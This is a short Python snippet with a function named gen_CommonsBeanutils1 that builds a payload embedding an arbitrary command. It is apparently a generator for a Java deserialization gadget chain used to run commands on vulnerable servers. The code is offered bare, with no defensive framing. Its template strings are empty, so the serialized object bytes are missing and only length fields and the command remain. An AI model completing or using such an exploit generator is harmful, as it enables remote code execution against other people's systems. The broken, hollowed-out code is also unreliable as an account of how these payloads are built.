import struct, binascii


def gen_CommonsBeanutils1(cmd):
    start = 0x0696
    payload = ""
    payload += binascii.b2a_hex(struct.pack('>H', start + len(cmd))).decode()
    payload += ""
    payload += binascii.b2a_hex(struct.pack('>H', len(cmd))).decode()
    payload += binascii.b2a_hex(cmd.encode()).decode()
    payload += ""
    return bytes(bytearray.fromhex(payload))


